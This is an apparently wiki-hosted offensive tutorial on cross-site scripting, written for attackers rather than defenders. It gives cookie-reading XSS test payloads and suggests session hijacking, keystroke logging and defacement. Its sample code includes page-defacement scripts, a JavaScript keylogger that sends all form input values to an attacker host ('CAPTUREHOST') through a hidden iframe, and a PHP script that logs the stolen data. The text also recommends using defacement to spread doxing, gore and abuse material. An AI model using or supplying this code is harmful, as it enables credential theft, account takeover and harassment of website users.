Cross site scripting (or XSS) is a method of exploiting a website that does not validate user supplied input or sanitize output. Web servers that fail to do so will allow you to run arbitrary javascript on an end users browser.

## Entrypoints ##

XSS entrypoints are usually found in webforms & querystrings. You can test for the existence of xss by using the following string.
```<script>alert(document.cookie);</script>```

You also may be able to include javascript embedded in a flash object, or an image like so:
```<img src="javascript:alert(document,cookie);" />```

But this varies between browsers.
Another way is like this
```<a href="javascript:alert(document.cookie);">link</a>```

But this requires your target to click a link

## Things To Do ##


1. Hijack user sessions/cookies

  * Since user session ID and occasionally usernames/passwords are stored in cookies, you can steal cookie data to impersonate a user by either finding their uname/pass or using their server session ID.
1. Log Keystrokes

  * You can write some code in javascript to send data via ajax/iframes when a user presses a key.
1. Deface pages

  * If the xss exploit you've discovered is saved into a database and redisplayed to other users, you can deface the page by overlaying content.
Remember to always read up on the latest security news. Not long ago, someone figured how to perform an XSS attack _from a motherfucking IP phone_. How? Simple. When you start an IP phone call, your phone or software sends a caller ID. Most IP phone exchange servers log these caller IDs and let you display the call log on a web browser. The caller ID field on most IP telephony protocols (such as H.323 and SIP) is sent as text and saved into a database without validation, because people only send phone numbers on the caller ID field amirite? Well... someone wrote an IP phone program that could send Javascript code on the caller ID field, so that when the admin displayed the phone call log, the browser would run the Javascript! Once you can run Javascript on a browser, you have a platform from which you can launch all the attacks mentioned here and more.

## Sample Code ##

```//---Javascript
//Overlay a black background with LOL in big white text
html='<div style="position:absolute;top:0px;left:0px;z-index:99;width:100%;height:100%;background-color:black;"><h1 style="color:#fff;">LOLHAI</h1></div>';
document.write(html);```

```//---Javascript
//Change the content of <body>
html='<h1>LOLHAI</h1>';
window.document.body.innerHTML=html;```

```//---Javascript
//You can study the structure of a site and change the content for any element ID or tag name
html='<h1>LOLHAI</h1>';
document.getElementById('element_id').innerHTML = html;
document.getElementsByTagName('element_tag')[child].innerHTML = html;
//This is epic for trolling by inserting typos, disinformation, dox, gore, cp, etc```

```//---Javascript
//This is an example of a keylogger. There is also a php file on this article you can use to capture the data.
randVal = 'loldongs'+(Math.round((10000-5000) * Math.random() + 5000));
wp='<div style=":display:block;width:0;height:0;z-index:0;overflow:hidden;" id="'+randVal+'"></div>';
window.onload=function(){
        window.document.body.innerHTML='<div onkeyup="kl();">'+window.document.body.innerHTML+wp+'</div>';
}
function kl(){
        inp=document.getElementsByTagName('input');
        qs='';
        for(var i = 0; i < inp.length; i++){
                qs=qs+i+'_'+inp[i].name+'='+inp[i].value+'&';
        }
        cn=document.getElementById(randVal);
        kf='<iframe style="width:0;height:0;" src="http://CAPTUREHOST/capture.php?'+qs+'"></iframe>';
        cn.innerHTML=kf;
}```

```//---capture.php
//This will catch all data passed as querystrings and save them in a readable format with IP, referrer & timestamp 
<?php
        $dumpFile = "dump";
        $fh = fopen($dumpFile, 'a') or die("can't open file");
        fwrite($fh, date("m/d/y_g:i:s").'|'.$_SERVER['REMOTE_ADDR'].'|'.$_SERVER['HTTP_REFERER'].'|');
        foreach($_GET as $qs => $val){
                fwrite($fh, $qs."=".$val.'|');
        }
        fwrite($fh, "\n");
        fclose($fh);
?>```

{{tutorials}}

